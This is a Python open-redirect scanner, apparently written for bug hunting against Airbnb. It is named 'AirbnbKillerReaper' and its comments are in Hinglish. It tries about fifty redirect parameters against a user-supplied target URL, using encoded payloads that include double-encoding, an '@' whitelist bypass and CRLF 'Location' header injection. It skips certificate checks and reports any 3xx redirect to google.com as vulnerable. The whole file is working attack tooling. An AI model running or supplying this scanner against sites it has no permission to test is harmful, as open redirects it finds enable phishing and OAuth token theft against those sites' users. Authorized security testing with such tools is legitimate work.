import requests
import time
import random
import concurrent.futures
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, quote
from rich.console import Console
from rich.progress import track

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

class AirbnbKillerReaper:
    def __init__(self, base_url, headers=None, proxy=None, delay=0):
        self.base_url = base_url
        self.session = requests.Session()
        if headers: self.session.headers.update(headers)
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.delay = delay
        self.vulnerabilities = []

        # Aapki di hui exhaustive list
        self.target_params = [
            'redirect_uri', 'redirect_url', 'redirect_to', 'redir_url', 'return_to', 
            'return_path', 'returnTo', 'rurl', 'r', 'u', 'go', 'target', 'view', 
            'out', 'link', 'to', 'forward', 'forward_url', 'forwardTo', 'continue_url', 
            'next_url', 'dest_url', 'destination_url', 'callback_url', 'cb', 'service', 
            'service_url', 'checkout_url', 'success_url', 'failure_url', 'cancel_url', 
            'image_url', 'file', 'data', 'reference', 'ref', 'domain', 'html', 
            'navigation', 'open', 'window', 'location', 'redirectUrl', 'RelayState', 
            'SAMLResponse', 'continue', 'return', 'next', 'goto'
        ]

        # Base Payloads
        self.base_payloads = [
    "https%253A%252F%252Fgoogle.com",         # Double Encoded (Airbnb Special)
    "https%3A%2F%2Fgoogle.com",               # Single Encoded
    "//google.com/%2f..",                     # Path Traversal Redirect
    "https://airbnb.com%252F@google.com",     # Whitelist Bypass
    "/%0d%0aLocation: google.com",            # Header Injection
    "google%E3%80%82com"]

    def get_smart_payloads(self, payload):
        """Ek payload se 3 variations banata hai (Plain, Encoded, Double Encoded)"""
        # Plain: https://google.com
        # Encoded: https%3A%2F%2Fgoogle.com
        # Double: https%253A%252F%252Fgoogle.com
        encoded = quote(payload, safe='')
        double_encoded = encoded.replace('%', '%25')
        return [payload, encoded, double_encoded]

    def attack(self, url):
        parsed = urlparse(url)
        # Agar URL mein params hain toh unhe use karo, warna default list inject karo
        current_params = list(parse_qs(parsed.query).keys()) if parsed.query else self.target_params
        
        for p in current_params:
            for base in self.base_payloads:
                # Har base payload ke smart variations test karo
                for final_payload in self.get_smart_payloads(base):
                    # Check if '?' already exists
                    sep = "&" if "?" in url else "?"
                    test_url = f"{url.split('?')[0]}{sep}{p}={final_payload}"
                    
                    try:
                        if self.delay > 0: time.sleep(self.delay)
                        resp = self.session.get(test_url, proxies=self.proxy, verify=False, allow_redirects=False, timeout=5)
                        loc = resp.headers.get("Location", "")
                        
                        # Verification: Agar location mein google.com aa jaye (chahe encoded ho ya plain)
                        if resp.status_code in [301, 302, 303, 307, 308] and "google.com" in loc.lower():
                            return (test_url, resp.status_code, loc)
                    except: pass
        return None

    def run(self):
        console.print(f"[bold cyan][*] Target Loaded: {self.base_url}[/bold cyan]")
        console.print(f"[*] Testing {len(self.target_params)} parameters with Triple-Encoding logic...")
        
        # Airbnb case fix: Test the URL itself
        res = self.attack(self.base_url)
        if res:
            console.print(f"[bold red]!! VULNERABLE !![/bold red]\nURL: {res[0]}\nRedirects to: {res[2]}")
        else:
            console.print("[yellow][!] No redirect captured with current payloads.[/yellow]")

if __name__ == "__main__":
    target = console.input("[bold white]Target URL: [/bold white]")
    reaper = AirbnbKillerReaper(target)
    reaper.run()